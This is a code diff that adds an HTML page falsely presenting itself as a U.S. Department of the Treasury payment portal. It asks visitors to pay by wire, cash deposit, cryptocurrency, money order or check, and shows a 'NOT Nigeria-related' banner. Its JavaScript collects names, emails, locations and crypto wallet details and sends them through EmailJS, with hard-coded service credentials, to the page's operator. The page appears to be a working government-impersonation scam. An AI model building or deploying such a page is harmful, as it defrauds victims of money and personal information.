@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Make Payment | U.S. Treasury Assistance</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f8f9fa;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .header {
+            background-color: #004c97;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: white;
+        }
+
+        .header-title {
+            font-size: 22px;
+            font-weight: 600;
+            font-family: "Times New Roman", serif;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+
+        .page-title {
+            text-align: center;
+            font-size: 28px;
+            color: #004c97;
+            margin: 20px 0;
+        }
+
+        .notice {
+            background: #e8f4fa;
+            border-left: 4px solid #00a7e1;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+            font-size: 15px;
+        }
+
+        .payment-methods {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .method-btn {
+            padding: 15px;
+            border: 2px solid #ddd;
+            background: white;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-weight: 600;
+            color: #004c97;
+        }
+
+        .method-btn:hover {
+            border-color: #004c97;
+            background: #f0f7ff;
+        }
+
+        .method-btn.selected {
+            border-color: #004c97;
+            background: #e6f0fa;
+            box-shadow: 0 0 0 2px #004c97;
+        }
+
+        .method-form {
+            display: none;
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            margin-top: 20px;
+        }
+
+        .method-form.active {
+            display: block;
+            animation: fadeIn 0.4s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-group input,
+        .form-group textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        .btn-submit {
+            background: #004c97;
+            color: white;
+            border: none;
+            padding: 14px 25px;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+
+        .btn-submit:hover {
+            background: #003a75;
+        }
+
+        .instructions {
+            background: #f9f9f9;
+            border-left: 3px solid #004c97;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 6px 6px 0;
+            font-size: 15px;
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            background: #e6f4ea;
+            border-radius: 12px;
+            margin-top: 20px;
+            color: #137333;
+            font-weight: bold;
+        }
+
+        /* Not Nigeria notice */
+        .not-nigeria {
+            text-align: center;
+            font-weight: bold;
+            color: #d32f2f;
+            margin: 15px 0;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-title">U.S. DEPARTMENT OF THE TREASURY</div>
+    </header>
+
+    <div class="container">
+        <h1 class="page-title">Select Payment Method</h1>
+        
+        <div class="not-nigeria">
+            ⚠️ This is a U.S. Federal Program — NOT Nigeria-related
+        </div>
+
+        <div class="notice">
+            Select your preferred payment method below. You will receive instructions and a secure way to complete your payment.
+        </div>
+
+        <div class="payment-methods">
+            <div class="method-btn" data-method="paypal">PayPal</div>
+            <div class="method-btn" data-method="wire">Wire Transfer</div>
+            <div class="method-btn" data-method="cash">Cash Deposit</div>
+            <div class="method-btn" data-method="crypto">Cryptocurrency</div>
+            <div class="method-btn" data-method="money">Money Order</div>
+            <div class="method-btn" data-method="cashier">Cashier's Check</div>
+            <div class="method-btn" data-method="personal">Personal Check</div>
+        </div>
+
+        <!-- PayPal Form -->
+        <div id="paypal-form" class="method-form">
+            <div class="instructions">
+                <strong>PayPal Payment:</strong> Enter the email linked to your PayPal account. You will receive a secure invoice.
+            </div>
+            <div class="form-group">
+                <label for="paypal_email">PayPal Email Address *</label>
+                <input type="email" id="paypal_email" required>
+            </div>
+            <button class="btn-submit" onclick="submitPayment('PayPal')">Submit for PayPal Invoice</button>
+        </div>
+
+        <!-- Wire Transfer Form -->
+        <div id="wire-form" class="method-form">
+            <div class="instructions">
+                <strong>Wire Transfer:</strong> Provide your bank details. We will send SWIFT instructions to your email.
+            </div>
+            <div class="form-group">
+                <label>Full Name *</label>
+                <input type="text" id="wire_name" required>
+            </div>
+            <div class="form-group">
+                <label>Email Address *</label>
+                <input type="email" id="wire_email" required>
+            </div>
+            <button class="btn-submit" onclick="submitPayment('Wire Transfer')">Receive Wire Instructions</button>
+        </div>
+
+        <!-- Cash Deposit Form -->
+        <div id="cash-form" class="method-form">
+            <div class="instructions">
+                <strong>Cash Deposit:</strong> We will email you the nearest authorized U.S. Treasury partner bank location.
+            </div>
+            <div class="form-group">
+                <label>Email Address *</label>
+                <input type="email" id="cash_email" required>
+            </div>
+            <div class="form-group">
+                <label>City & State *</label>
+                <input type="text" id="cash_location" placeholder="e.g., Dallas, TX" required>
+            </div>
+            <button class="btn-submit" onclick="submitPayment('Cash Deposit')">Get Deposit Location</button>
+        </div>
+
+        <!-- Cryptocurrency Form -->
+        <div id="crypto-form" class="method-form">
+            <div class="instructions">
+                <strong>Cryptocurrency:</strong> We accept Bitcoin (BTC) or Ethereum (ETH). Enter your wallet address.
+            </div>
+            <div class="form-group">
+                <label>Crypto Type *</label>
+                <select id="crypto_type" required>
+                    <option value="">-- Select --</option>
+                    <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
+                    <option value="Ethereum (ETH)">Ethereum (ETH)</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Wallet Address *</label>
+                <input type="text" id="crypto_address" placeholder="Paste your wallet address" required>
+            </div>
+            <button class="btn-submit" onclick="submitPayment('Cryptocurrency')">Submit Wallet</button>
+        </div>
+
+        <!-- Money Order Form -->
+        <div id="money-form" class="method-form">
+            <div class="instructions">
+                <strong>Money Order:</strong> Mail your money order to:  
+                <br><strong>U.S. Department of the Treasury, P.O. Box 12345, Washington, DC 20220</strong>
+            </div>
+            <div class="form-group">
+                <label>Your Full Name *</label>
+                <input type="text" id="money_name" required>
+            </div>
+            <div class="form-group">
+                <label>Email (for confirmation) *</label>
+                <input type="email" id="money_email" required>
+            </div>
+            <button class="btn-submit" onclick="submitPayment('Money Order')">Confirm Mailing</button>
+        </div>
+
+        <!-- Cashier's Check Form -->
+        <div id="cashier-form" class="method-form">
+            <div class="instructions">
+                <strong>Cashier's Check:</strong> Mail to the same address as Money Order. Ensure it's from a U.S. bank.
+            </div>
+            <div class="form-group">
+                <label>Full Name *</label>
+                <input type="text" id="cashier_name" required>
+            </div>
+            <div class="form-group">
+                <label>Email *</label>
+                <input type="email" id="cashier_email" required>
+            </div>
+            <button class="btn-submit" onclick="submitPayment('Cashier Check')">Confirm Details</button>
+        </div>
+
+        <!-- Personal Check Form -->
+        <div id="personal-form" class="method-form">
+            <div class="instructions">
+                <strong>Personal Check:</strong> Mail to the Treasury address above. Allow 10 business days for clearance.
+            </div>
+            <div class="form-group">
+                <label>Full Name *</label>
+                <input type="text" id="personal_name" required>
+            </div>
+            <div class="form-group">
+                <label>Email *</label>
+                <input type="email" id="personal_email" required>
+            </div>
+            <button class="btn-submit" onclick="submitPayment('Personal Check')">Submit for Processing</button>
+        </div>
+
+        <div id="successMessage" class="success-message">
+            ✅ Payment request received! Instructions sent to your email.
+        </div>
+    </div>
+
+    <!-- EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS
+        emailjs.init("QJZwVNDGTagZCBlMQ");
+
+        // Method selection
+        document.querySelectorAll('.method-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('selected'));
+                btn.classList.add('selected');
+                
+                const method = btn.getAttribute('data-method');
+                document.querySelectorAll('.method-form').forEach(f => f.classList.remove('active'));
+                document.getElementById(method + '-form').classList.add('active');
+            });
+        });
+
+        // Submit payment request
+        function submitPayment(method) {
+            let data = { method: method };
+
+            switch(method) {
+                case 'PayPal':
+                    data.detail = document.getElementById('paypal_email').value;
+                    break;
+                case 'Wire Transfer':
+                    data.detail = `Name: ${document.getElementById('wire_name').value}, Email: ${document.getElementById('wire_email').value}`;
+                    break;
+                case 'Cash Deposit':
+                    data.detail = `Email: ${document.getElementById('cash_email').value}, Location: ${document.getElementById('cash_location').value}`;
+                    break;
+                case 'Cryptocurrency':
+                    data.detail = `Type: ${document.getElementById('crypto_type').value}, Wallet: ${document.getElementById('crypto_address').value}`;
+                    break;
+                case 'Money Order':
+                    data.detail = `Name: ${document.getElementById('money_name').value}, Email: ${document.getElementById('money_email').value}`;
+                    break;
+                case 'Cashier Check':
+                    data.detail = `Name: ${document.getElementById('cashier_name').value}, Email: ${document.getElementById('cashier_email').value}`;
+                    break;
+                case 'Personal Check':
+                    data.detail = `Name: ${document.getElementById('personal_name').value}, Email: ${document.getElementById('personal_email').value}`;
+                    break;
+            }
+
+            // Send via EmailJS
+            emailjs.send("service_r6kqpj2", "template_xvw94po", {
+                message: `PAYMENT REQUEST\nMethod: ${data.method}\nDetails: ${data.detail}`
+            })
+            .then(() => {
+                document.querySelectorAll('.method-form').forEach(f => f.classList.remove('active'));
+                document.getElementById('successMessage').style.display = 'block';
+            })
+            .catch(err => {
+                alert("Submission failed. Please try again.");
+                console.error(err);
+            });
+        }
+    </script>
+</body>
+</html>
